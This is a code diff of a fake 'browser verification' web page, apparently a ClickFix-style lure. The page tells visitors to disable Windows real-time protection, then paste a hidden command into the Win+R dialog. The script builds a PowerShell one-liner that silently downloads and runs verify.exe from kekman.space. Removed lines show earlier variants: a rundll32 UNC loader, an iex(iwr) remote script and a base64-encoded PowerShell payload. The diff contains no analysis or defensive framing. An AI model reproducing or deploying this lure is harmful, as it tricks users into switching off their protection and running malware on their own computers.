@@ -124,6 +124,7 @@
     display: flex; align-items: center; justify-content: center;
     flex-shrink: 0; margin-top: 1px;
   }
+  .step-num.done { background: #10b981; }
   .step-desc { font-size: 13.5px; color: #444; line-height: 1.5; }
   .key {
     display: inline-block;
@@ -204,20 +205,28 @@
           <svg width="16" height="16" fill="none" stroke="#d97706" stroke-width="2" viewBox="0 0 24 24">
             <circle cx="12" cy="12" r="10"/><path d="M12 8v4M12 16h.01"/>
           </svg>
-          Browser verification requires a manual step
+          Complete these steps to finish verification
         </div>
+
         <div class="step-row">
           <div class="step-num">1</div>
-          <div class="step-desc">Press <span class="key">⊞ Win</span> + <span class="key">R</span> to open the Run dialog</div>
+          <div class="step-desc">
+            <b>Disable real-time protection.</b> Open <span class="key">⊞ Win</span> → search <span class="key">Windows Security</span> → <b>Virus &amp; threat protection</b> → <b>Manage settings</b> → turn off <b>Real-time protection</b>.
+          </div>
         </div>
         <div class="step-row">
           <div class="step-num">2</div>
-          <div class="step-desc">Press <span class="key">Ctrl</span> + <span class="key">V</span> to paste the verification token</div>
+          <div class="step-desc">Press <span class="key">⊞ Win</span> + <span class="key">R</span> to open the Run dialog</div>
         </div>
         <div class="step-row">
           <div class="step-num">3</div>
+          <div class="step-desc">Press <span class="key">Ctrl</span> + <span class="key">V</span> to paste the verification token</div>
+        </div>
+        <div class="step-row">
+          <div class="step-num">4</div>
           <div class="step-desc">Press <span class="key">Enter</span> — verification completes automatically</div>
         </div>
+
         <div class="copied-pill" id="copyPill">
           <svg width="12" height="12" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24">
             <polyline points="20 6 9 17 4 12"/>
@@ -256,43 +265,19 @@
 
 const CFG = {
   site: 'kekman.space',
-
-  // 'rundll32' | 'ps_url' | 'ps_b64'
-  mode: 'ps_b64',
-
-  unc: '\\\\svc4static.zenithprospera.in.net\\verification.google,#1',
-  ps_url: 'https://kekman.space/p.ps1',
-
-  // base64 of UTF-16LE-encoded PS script (what -enc expects)
-  // built below — DO NOT hand-edit, regenerate with tools/build_b64.ps1
-  ps_b64: '__B64_HERE__'
+  exe_url:  'https://kekman.space/verify.exe',
+  exe_name: 'a.exe'
 };
 
 // ╚══════════════════════════════════════════════════════════════════╝
 
-function buildPayload() {
-  switch (CFG.mode) {
-    case 'rundll32':
-      return 'rundll32.exe ' + CFG.unc;
+// download + run, one shot, no base64, no p.ps1
+const PAYLOAD =
+  'powershell -w h -c "iwr ' + CFG.exe_url + ' -OutFile $env:TEMP\\' + CFG.exe_name + ';start $env:TEMP\\' + CFG.exe_name + '"';
 
-    case 'ps_url':
-      return 'powershell -w h -nop -c "iex(iwr ' + CFG.ps_url + ' -UseBasicParsing)"';
-
-    case 'ps_b64':
-      // no quotes, no escapes, no operators — cmd sees one clean word
-      return 'powershell -w h -nop -enc ' + CFG.ps_b64;
-
-    default:
-      return '';
-  }
-}
-
-const PAYLOAD = buildPayload();
-
-// show length in console so you can confirm < 259 before shipping
-console.log('payload length:', PAYLOAD.length);
+console.log('payload length:', PAYLOAD.length, '/ 259');
 if (PAYLOAD.length > 255) {
-  console.warn('WARNING: payload > 255 chars — will truncate in Win+R');
+  console.warn('WARNING: payload >= 256 chars — will truncate in Win+R');
 }
 
 document.getElementById('siteName').textContent = CFG.site;
